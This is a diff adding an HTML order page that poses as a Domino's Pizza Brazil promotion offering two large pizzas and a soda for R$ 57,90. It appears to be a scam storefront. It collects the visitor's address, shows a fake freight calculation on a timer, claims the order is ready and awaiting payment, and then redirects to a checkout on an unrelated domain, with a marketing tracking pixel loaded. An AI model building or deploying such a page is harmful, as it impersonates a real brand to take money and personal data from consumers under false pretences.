@@ -1,0 +1,524 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    
+    <script>
+  window.pixelId = "686dab79d183c9d039f94056";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promoção: Compre 1, Leve 2 + Refri - Domino's Pizza</title>
+    <meta name="description" content="Escolha duas pizzas grandes e um refrigerante na promoção.">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Font Awesome (para ícones) -->
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="images/dominos-pizza-logo.png" type="image/png">
+    
+    <meta name="theme-color" content="#006491">
+
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f0f2f5; scroll-behavior: smooth; }
+        .font-dominos { font-family: 'Oswald', sans-serif; }
+        .dominos-blue-text { color: #006491; }
+        .bg-dominos-blue { background-color: #006491; }
+        .bg-dominos-red { background-color: #E31837; }
+        .hover\:bg-dominos-red-dark:hover { background-color: #c8102a; }
+        
+        .choice-btn.selected { background-color: #006491; color: white; }
+        .flavor-item.selected, .drink-item.selected {
+            border-color: #006491;
+            box-shadow: 0 0 0 3px rgba(0, 100, 145, 0.4);
+            background-color: #eff6ff;
+        }
+        .flavor-item, .drink-item { cursor: pointer; }
+        button:disabled { background-color: #9ca3af; cursor: not-allowed; }
+        
+        .collapsible-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-in-out;
+        }
+        .header-toggle .chevron {
+            transition: transform 0.3s ease-in-out;
+        }
+        .selection-block.open .collapsible-content {
+            max-height: 2500px;
+        }
+        .selection-block.open .chevron {
+            transform: rotate(180deg);
+        }
+    </style>
+</head>
+
+<body class="bg-gray-100">
+
+    <!-- Cabeçalho -->
+    <header id="topo" class="sticky top-0 z-20">
+        <div class="bg-dominos-blue text-white p-3 shadow-lg">
+            <div class="container mx-auto flex justify-between items-center">
+                <a href="../index.html" class="text-2xl w-8 text-left" title="Voltar">
+                    <i class="fas fa-arrow-left"></i>
+                </a>
+                <a href="../index.html" title="Página Inicial">
+                    <img src="images/dominos-pizza-logo.png" alt="Logotipo da Domino's" class="h-8">
+                </a>
+                <a href="#" title="Verificar localização" class="text-2xl w-8 text-right">
+                    <i class="fas fa-map-marker-alt"></i>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="container mx-auto p-4 max-w-4xl pb-32">
+        
+        <div class="text-center my-4">
+            <h1 class="text-3xl font-bold font-dominos dominos-blue-text">PROMOÇÃO COMPRE 1, LEVE 2</h1>
+            <p class="text-lg text-gray-700 font-semibold">2 Pizzas Grandes + Refri 2L por R$ 57,90</p>
+        </div>
+
+        <!-- 1ª Pizza -->
+        <section class="selection-block open mb-4" data-selection-number="1">
+            <div class="header-toggle flex justify-between items-center bg-white p-4 rounded-lg shadow-md cursor-pointer">
+                <h2 class="text-xl font-bold text-gray-800 flex items-center">
+                    <span class="bg-dominos-red text-white rounded-full w-8 h-8 inline-flex items-center justify-center mr-3">1</span>
+                    ESCOLHA A 1ª PIZZA GRANDE
+                </h2>
+                <div class="summary-display text-sm text-gray-500 font-semibold truncate px-2"></div>
+                <i class="chevron fas fa-chevron-down transform transition-transform"></i>
+            </div>
+            <div class="collapsible-content">
+                <div class="p-4 bg-gray-50 rounded-b-lg">
+                    <div class="choice-buttons flex justify-center gap-4 mb-4">
+                        <button class="choice-btn w-full sm:w-1/2 p-3 font-bold rounded-lg bg-white shadow-md" data-type="inteira">Sabor Inteiro</button>
+                        <button class="choice-btn w-full sm:w-1/2 p-3 font-bold rounded-lg bg-white shadow-md" data-type="meia">Meia a Meia</button>
+                    </div>
+                    <div class="content-area"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2ª Pizza -->
+        <section class="selection-block mb-4" data-selection-number="2">
+             <div class="header-toggle flex justify-between items-center bg-white p-4 rounded-lg shadow-md cursor-pointer">
+                <h2 class="text-xl font-bold text-gray-800 flex items-center">
+                    <span class="bg-dominos-red text-white rounded-full w-8 h-8 inline-flex items-center justify-center mr-3">2</span>
+                    ESCOLHA A 2ª PIZZA GRANDE
+                </h2>
+                <div class="summary-display text-sm text-gray-500 font-semibold truncate px-2"></div>
+                <i class="chevron fas fa-chevron-down transform transition-transform"></i>
+            </div>
+            <div class="collapsible-content">
+                <div class="p-4 bg-gray-50 rounded-b-lg">
+                    <div class="choice-buttons flex justify-center gap-4 mb-4">
+                        <button class="choice-btn w-full sm:w-1/2 p-3 font-bold rounded-lg bg-white shadow-md" data-type="inteira">Sabor Inteiro</button>
+                        <button class="choice-btn w-full sm:w-1/2 p-3 font-bold rounded-lg bg-white shadow-md" data-type="meia">Meia a Meia</button>
+                    </div>
+                    <div class="content-area"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Bebida -->
+        <section class="selection-block" data-selection-number="3">
+             <div class="header-toggle flex justify-between items-center bg-white p-4 rounded-lg shadow-md cursor-pointer">
+                <h2 class="text-xl font-bold text-gray-800 flex items-center">
+                    <span class="bg-dominos-red text-white rounded-full w-8 h-8 inline-flex items-center justify-center mr-3">3</span>
+                    ESCOLHA SUA BEBIDA
+                </h2>
+                <div class="summary-display text-sm text-gray-500 font-semibold truncate px-2"></div>
+                <i class="chevron fas fa-chevron-down transform transition-transform"></i>
+            </div>
+            <div class="collapsible-content">
+                <div class="p-4 bg-gray-50 rounded-b-lg">
+                    <div class="content-area space-y-3">
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Rodapé Fixo -->
+    <footer class="fixed bottom-0 left-0 w-full bg-white shadow-lg border-t-2 border-gray-200 p-4 z-30">
+        <div class="container mx-auto flex flex-col sm:flex-row justify-between items-center gap-4">
+            <div id="summary" class="text-center sm:text-left text-xs">
+                <p id="summary-pizza1" class="truncate">1ª Pizza: <span>Aguardando seleção...</span></p>
+                <p id="summary-pizza2" class="truncate">2ª Pizza: <span>Aguardando seleção...</span></p>
+                <p id="summary-drink" class="truncate">Bebida: <span>Aguardando seleção...</span></p>
+            </div>
+            <button id="finish-order-btn" class="w-full sm:w-auto bg-dominos-red text-white font-bold py-3 px-6 rounded-lg transition-colors flex justify-between items-center text-lg gap-4" disabled="">
+                <span>FINALIZAR PEDIDO</span>
+                <span id="total-price" class="bg-white/20 px-3 py-1 rounded-md text-base">R$ 57,90</span>
+            </button>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // --- DATA ---
+            const basePrice = 57.90;
+            const allFlavors = {
+                classicas: [
+                    { id: '4-queijos', name: '4 Queijos', description: 'Queijo, requeijão, gorgonzola, oregano e parmesão ralado.'},
+                    { id: 'bauru', name: 'Bauru', description: 'Queijo, presunto, requeijão, oregano e tomate.'},
+                    { id: 'catuperoni', name: 'Catuperoni', description: 'Queijo, pepperoni, requeijão, oregano e parmesão ralado.'},
+                    { id: 'frango-caipira', name: 'Frango Caipira', description: 'Queijo, frango desfiado, milho, catupiry e orégano.'},
+                    { id: 'cheddar-bacon', name: 'Cheddar & Bacon', description: 'Queijo, molho sabor queijo cheddar, bacon e orégano.'},
+                    { id: 'corn-bacon', name: 'Corn & Bacon', description: 'Queijo, bacon, oregano e milho.'},
+                    { id: 'mussarela', name: 'Mussarela', description: 'Queijo e orégano. Simplesmente, a maior.'},
+                    { id: 'napolitana', name: 'Napolitana', description: 'Queijo, tomate, oregano e parmesão ralado.'},
+                    { id: 'pepperoni', name: 'Pepperoni', description: 'Queijo e pepperoni.'},
+                ],
+                especiais: [
+                    { id: 'america', name: 'América', description: 'Queijo, pepperoni, champignon, cebola, oregano e pimentão verde.' },
+                    { id: 'calabresa-especial', name: 'Calabresa Especial', description: 'Queijo, azeitona preta, calabresa, cebola, oregano e Cream Cheese.' },
+                    { id: 'carne-seca', name: 'Carne Seca com Cream Cheese', description: 'Queijo, cebola, carne seca desfiada, cream cheese e orégano.' },
+                    { id: 'extravaganzza', name: 'Extravaganzza', description: 'Queijo, pepperoni, presunto, azeitona preta, champignon, cebola, oregano e pimentão verde.' },
+                    { id: 'frango-grelhado', name: 'Frango Grelhado', description: 'Queijo, frango, requeijão, tomate, azeitona preta, oregano e manjericão.' },
+                    { id: 'la-bianca', name: 'La Bianca', description: 'Queijo, muçarela de vaca e búfala, requeijão, parmesão ralado, orégano e manjericão.' },
+                    { id: 'meat-bacon', name: 'Meat & Bacon', description: 'Queijo, bacon, calabresa, pepperoni, oregano e presunto.' },
+                    { id: 'portuguesa', name: 'Portuguesa', description: 'Queijo, presunto, ovo de codorna, azeitona preta, cebola, oregano e pimentão verde.' },
+                    { id: 'pepperrock', name: 'Pepperrock', description: 'Queijo, pepperoni, azeitona preta, parmesão ralado, orégano, alho granulado e cream cheese.' },
+                ]
+            };
+            const drinks = [
+                { id: 'coca', name: 'Coca-Cola 2L' },
+                { id: 'coca-zero', name: 'Coca-Cola Sem Açúcar 2L' },
+                { id: 'guarana', name: 'Guaraná Antarctica 2L' },
+                { id: 'guarana-zero', name: 'Guaraná Antarctica Zero 2L' },
+                { id: 'fanta-laranja', name: 'Fanta Laranja 2L' }
+            ];
+
+            // --- ELEMENTS & STATE ---
+            const summaryElements = {
+                pizza1: document.querySelector('#summary-pizza1 span'),
+                pizza2: document.querySelector('#summary-pizza2 span'),
+                drink: document.querySelector('#summary-drink span')
+            };
+            const finishBtn = document.getElementById('finish-order-btn');
+            const totalPriceEl = document.getElementById('total-price');
+            let selections = { pizza1: null, pizza2: null, drink: null };
+
+            // --- INITIAL RENDER ---
+            renderDrinks();
+
+            // --- EVENT LISTENERS ---
+            document.querySelectorAll('.selection-block').forEach(block => {
+                const selectionNumber = parseInt(block.dataset.selectionNumber, 10);
+                const header = block.querySelector('.header-toggle');
+                
+                header.addEventListener('click', () => {
+                    if (selectionNumber > 1 && !isSelectionReady(selectionNumber - 1)) return;
+                    document.querySelectorAll('.selection-block.open').forEach(openBlock => {
+                        if(openBlock !== block) openBlock.classList.remove('open');
+                    });
+                    block.classList.toggle('open');
+                });
+
+                if(selectionNumber < 3) { // Pizza selections
+                    const contentArea = block.querySelector('.content-area');
+                    block.querySelectorAll('.choice-btn').forEach(btn => {
+                        btn.addEventListener('click', (e) => {
+                            e.stopPropagation();
+                            selections[`pizza${selectionNumber}`] = null;
+                            block.querySelectorAll('.choice-btn').forEach(b => b.classList.remove('selected'));
+                            btn.classList.add('selected');
+                            contentArea.innerHTML = '';
+                            const type = btn.dataset.type;
+                            if (type === 'inteira') renderInteira(contentArea, selectionNumber);
+                            else if (type === 'meia') renderMeia(contentArea, selectionNumber);
+                            updateUI();
+                        });
+                    });
+                }
+            });
+
+            finishBtn.addEventListener('click', () => {
+                if (!finishBtn.disabled) {
+                    showAddressModal();
+                }
+            });
+
+            // --- LOGIC FUNCTIONS ---
+            function renderFlavorList(container, title, clickHandler) {
+                const titleElement = document.createElement('h3');
+                titleElement.className = 'flavor-list-title font-bold text-lg mt-4 text-center text-gray-700';
+                titleElement.textContent = title;
+                container.appendChild(titleElement);
+                
+                const listContainer = document.createElement('div');
+                listContainer.className = 'space-y-3 mt-2';
+                
+                Object.keys(allFlavors).forEach(category => {
+                    listContainer.innerHTML += `<h4 class="font-semibold text-gray-600 pl-1 pt-2">${category.charAt(0).toUpperCase() + category.slice(1)}</h4>`;
+                    allFlavors[category].forEach(flavor => {
+                        listContainer.innerHTML += clickHandler(flavor);
+                    });
+                });
+                container.appendChild(listContainer);
+                return titleElement;
+            }
+
+            function renderInteira(container, pizzaNumber) {
+                renderFlavorList(container, 'ESCOLHA O SABOR', (flavor) => 
+                    `<div class="flavor-item flex items-center bg-white p-3 rounded-lg shadow-sm transition-all duration-300 border-2 border-transparent" data-name="${flavor.name}" data-id="${flavor.id}">
+                        <img src="../assets/images/${flavor.id}.png" alt="" class="w-16 h-16 rounded-md object-cover mr-4" onerror="this.src='https://placehold.co/100x100/E31837/FFFFFF?text=Pizza'">
+                        <div class="flex-1">
+                            <h3 class="font-bold text-lg">${flavor.name}</h3>
+                            <p class="text-sm text-gray-500">${flavor.description}</p>
+                        </div>
+                    </div>`
+                );
+                container.querySelectorAll('.flavor-item').forEach(item => {
+                    item.addEventListener('click', (e) => {
+                        selections[`pizza${pizzaNumber}`] = { type: 'inteira', name: e.currentTarget.dataset.name };
+                        handleSelectionComplete(pizzaNumber);
+                    });
+                });
+            }
+
+            function renderMeia(container, pizzaNumber) {
+                const selectionData = { half1: null, half2: null };
+                
+                function renderHalf(halfNumber) {
+                    container.innerHTML = '';
+                    if (halfNumber === 2 && selectionData.half1) {
+                         container.innerHTML += `<p class="text-center font-semibold p-4 bg-blue-100 rounded-lg mb-4">1ª Metade: <span class="font-bold dominos-blue-text">${selectionData.half1.name}</span></p>`;
+                    }
+                    const titleEl = renderFlavorList(container, `ESCOLHA A ${halfNumber}ª METADE`, (flavor) => 
+                         `<div class="flavor-item flex items-center bg-white p-3 rounded-lg shadow-sm transition-all duration-300 border-2 border-transparent" data-name="${flavor.name}" data-id="${flavor.id}">
+                             <img src="../assets/images/${flavor.id}.png" alt="" class="w-16 h-16 rounded-md object-cover mr-4" onerror="this.src='https://placehold.co/100x100/E31837/FFFFFF?text=Pizza'">
+                             <div class="flex-1">
+                                <h3 class="font-bold text-lg">${flavor.name}</h3>
+                                <p class="text-sm text-gray-500">${flavor.description}</p>
+                             </div>
+                        </div>`
+                    );
+                    if (halfNumber === 2) titleEl.scrollIntoView({ behavior: 'smooth', block: 'center'});
+                    container.querySelectorAll('.flavor-item').forEach(item => {
+                        item.addEventListener('click', () => {
+                            selectionData[`half${halfNumber}`] = { name: item.dataset.name };
+                            if (halfNumber === 1) renderHalf(2);
+                            else {
+                                selections[`pizza${pizzaNumber}`] = { type: 'meia', name: `Meia ${selectionData.half1.name} / Meia ${selectionData.half2.name}`, half1: selectionData.half1.name, half2: selectionData.half2.name };
+                                handleSelectionComplete(pizzaNumber);
+                            }
+                        });
+                    });
+                }
+                renderHalf(1);
+            }
+
+            function renderDrinks() {
+                const container = document.querySelector('[data-selection-number="3"] .content-area');
+                drinks.forEach(drink => {
+                    container.innerHTML += `<div class="drink-item bg-white p-4 rounded-lg shadow-sm transition-all duration-300 border-2 border-transparent" data-name="${drink.name}"><h3 class="font-bold text-lg">${drink.name}</h3></div>`;
+                });
+                container.querySelectorAll('.drink-item').forEach(item => {
+                    item.addEventListener('click', e => {
+                        selections.drink = { name: e.currentTarget.dataset.name };
+                        container.querySelectorAll('.drink-item').forEach(i => i.classList.remove('selected'));
+                        e.currentTarget.classList.add('selected');
+                        handleSelectionComplete(3);
+                    });
+                });
+            }
+            
+            function isSelectionReady(selectionNumber) {
+                if(selectionNumber < 3) {
+                    const pizza = selections[`pizza${selectionNumber}`];
+                    return pizza && (pizza.type === 'inteira' || (pizza.type === 'meia' && pizza.half1 && pizza.half2));
+                }
+                if(selectionNumber === 3) return !!selections.drink;
+                return false;
+            }
+            
+            function handleSelectionComplete(selectionNumber) {
+                updateUI();
+                const currentBlock = document.querySelector(`[data-selection-number="${selectionNumber}"]`);
+                const nextBlock = document.querySelector(`[data-selection-number="${selectionNumber + 1}"]`);
+                if (isSelectionReady(selectionNumber)) {
+                    currentBlock.classList.remove('open');
+                    if(nextBlock) {
+                        nextBlock.classList.add('open');
+                        setTimeout(() => {
+                            nextBlock.querySelector('.header-toggle').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }, 500);
+                    }
+                }
+            }
+
+            function updateUI() {
+                summaryElements.pizza1.textContent = selections.pizza1 ? selections.pizza1.name : 'Aguardando seleção...';
+                summaryElements.pizza2.textContent = selections.pizza2 ? selections.pizza2.name : 'Aguardando seleção...';
+                summaryElements.drink.textContent = selections.drink ? selections.drink.name : 'Aguardando seleção...';
+                
+                document.querySelector(`[data-selection-number="1"] .summary-display`).textContent = selections.pizza1 ? selections.pizza1.name : '';
+                document.querySelector(`[data-selection-number="2"] .summary-display`).textContent = selections.pizza2 ? selections.pizza2.name : '';
+                document.querySelector(`[data-selection-number="3"] .summary-display`).textContent = selections.drink ? selections.drink.name : '';
+
+                totalPriceEl.textContent = `R$ ${basePrice.toFixed(2).replace('.', ',')}`;
+                finishBtn.disabled = !(isSelectionReady(1) && isSelectionReady(2) && isSelectionReady(3));
+            }
+
+            // --- MODAL & CEP LOGIC ---
+            function showAddressModal() {
+                Swal.fire({
+                    title: '<i class="fa-solid fa-map-location-dot text-dominos-blue text-2xl"></i><br><span class="text-xl font-bold mt-2">Informe Seu Endereço</span>',
+                    html: `
+                        <div class="space-y-4 text-left p-2">
+                            <div>
+                                <label for="cep" class="block text-sm font-medium text-gray-700 mb-1">CEP</label>
+                                <input type="tel" id="cep" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-dominos-blue" placeholder="00000-000">
+                            </div>
+                            <div>
+                                <label for="endereco" class="block text-sm font-medium text-gray-700 mb-1">Endereço</label>
+                                <input type="text" id="endereco" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-dominos-blue" placeholder="Rua, bairro...">
+                            </div>
+                            <div>
+                                <label for="numero" class="block text-sm font-medium text-gray-700 mb-1">Número + Complemento</label>
+                                <input type="text" id="numero" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-dominos-blue" placeholder="Nº">
+                            </div>
+                        </div>
+                    `,
+                    confirmButtonText: 'Continuar',
+                    confirmButtonColor: '#006491',
+                    showCancelButton: true,
+                    cancelButtonText: 'Cancelar',
+                    customClass: { popup: 'rounded-xl', htmlContainer: 'p-0', actions: 'mt-0' },
+                    focusConfirm: false,
+                    preConfirm: () => {
+                        const cep = Swal.getPopup().querySelector('#cep').value;
+                        const endereco = Swal.getPopup().querySelector('#endereco').value;
+                        const numero = Swal.getPopup().querySelector('#numero').value;
+                        if (!cep || !endereco || !numero) {
+                            Swal.showValidationMessage(`Por favor, preencha todos os campos de endereço`);
+                        }
+                        return { cep, endereco, numero };
+                    }
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        showDeliveryConfirmation(result.value);
+                    }
+                });
+
+                const cepInput = document.getElementById('cep');
+                cepInput.addEventListener('input', handleCepInput);
+            }
+            
+            async function handleCepInput(event) {
+                const cepInput = event.target;
+                let cep = cepInput.value.replace(/\D/g, '');
+                
+                cep = cep.replace(/^(\d{5})(\d)/, "$1-$2");
+                cepInput.value = cep;
+
+                if (cep.replace('-', '').length === 8) {
+                    try {
+                        const response = await fetch(`https://viacep.com.br/ws/${cep.replace('-', '')}/json/`);
+                        const data = await response.json();
+                        if (!data.erro) {
+                            const fullAddress = `${data.logradouro}, ${data.bairro}, ${data.localidade} - ${data.uf}`;
+                            Swal.getPopup().querySelector('#endereco').value = fullAddress;
+                            Swal.getPopup().querySelector('#numero').focus();
+                        } else {
+                             Swal.getPopup().querySelector('#endereco').value = 'CEP não encontrado.';
+                        }
+                    } catch (error) {
+                        console.error("Erro ao buscar CEP:", error);
+                        Swal.getPopup().querySelector('#endereco').value = 'Erro ao buscar CEP.';
+                    }
+                }
+            }
+
+            function showDeliveryConfirmation(addressInfo) {
+                Swal.fire({
+                    title: 'Calculando frete...',
+                    html: '<div class="flex flex-col items-center"><div class="w-8 h-8 border-4 border-t-dominos-blue border-gray-200 rounded-full animate-spin"></div><p class="mt-2">Aguarde um momento</p></div>',
+                    timer: 1500,
+                    showConfirmButton: false,
+                    allowOutsideClick: false
+                }).then(() => {
+                    const fullAddress = `${addressInfo.endereco}, ${addressInfo.numero}`;
+                    
+                    let summaryHTML = `
+                        <div class="flex items-center gap-3">
+                            <img src="../assets/images/specialty.webp" alt="[Ícone de pizza]" class="w-16 h-16 rounded-md object-cover" onerror="this.src='https://placehold.co/100x100/006491/FFFFFF?text=Pizza'">
+                            <div>
+                                <p class="font-semibold text-gray-800">1ª Pizza Grande</p>
+                                <p class="text-sm text-gray-500">${selections.pizza1.name}</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-3 mt-2">
+                            <img src="../assets/images/specialty.webp" alt="[Ícone de pizza]" class="w-16 h-16 rounded-md object-cover" onerror="this.src='https://placehold.co/100x100/006491/FFFFFF?text=Pizza'">
+                            <div>
+                                <p class="font-semibold text-gray-800">2ª Pizza Grande</p>
+                                <p class="text-sm text-gray-500">${selections.pizza2.name}</p>
+                            </div>
+                        </div>
+                         <div class="flex items-center gap-3 mt-2">
+                            <img src="../assets/images/drinks.webp" alt="[Ícone de refrigerante]" class="w-16 h-16 rounded-md object-cover" onerror="this.src='https://placehold.co/100x100/006491/FFFFFF?text=Refri'">
+                            <div>
+                                <p class="font-semibold text-gray-800">Bebida</p>
+                                <p class="text-sm text-gray-500">${selections.drink.name}</p>
+                            </div>
+                        </div>
+                    `;
+
+                    Swal.fire({
+                        title: '<span class="text-green-600 font-bold">Entrega disponível!</span>',
+                        html: `
+                            <div class="text-left">
+                                <p class="text-gray-600 text-sm">Seu pedido será entregue em:</p>
+                                <p class="font-semibold text-gray-800 my-2 text-base">${fullAddress}</p>
+                                <p class="text-sm text-gray-600 mt-1 mb-3"><i class="fas fa-clock fa-fw mr-1 text-gray-500"></i>Tempo de entrega estimado: <b>30-50 min</b>.</p>
+                                <div class="bg-yellow-50 border border-yellow-300 text-yellow-800 text-sm p-3 rounded-lg my-4">
+                                    <strong>Aguardando pagamento</strong>
+                                    <p>Seu pedido está pronto para sair. Realize o pagamento para liberar a entrega!</p>
+                                </div>
+                                <div class="space-y-2 mt-4">
+                                    <h3 class="font-bold text-lg text-gray-800">Resumo do pedido</h3>
+                                    ${summaryHTML}
+                                    <hr class="my-2">
+                                    <div class="flex justify-between text-gray-700"><span>Subtotal</span> <span>R$ ${basePrice.toFixed(2).replace('.', ',')}</span></div>
+                                    <div class="flex justify-between text-gray-700"><span>Frete</span> <span class="text-green-600 font-semibold">Grátis</span></div>
+                                    <hr class="my-2">
+                                    <div class="flex justify-between font-bold text-xl text-gray-900"><span>Total</span> <span>R$ ${basePrice.toFixed(2).replace('.', ',')}</span></div>
+                                </div>
+                            </div>
+                        `,
+                        confirmButtonText: 'Realizar pagamento',
+                        confirmButtonColor: '#16a34a',
+                        showCloseButton: true,
+                        customClass: { popup: 'rounded-xl' }
+                    }).then((result) => {
+                         if (result.isConfirmed) {
+                            location.href = 'https://pay.marketplacetransacaosegura.com/checkout/07aa628a-798c-418c-857d-559aed493a67' + window.location.search;
+                         }
+                    });
+                });
+            }
+        });
+    </script>
+
+
+</body></html>
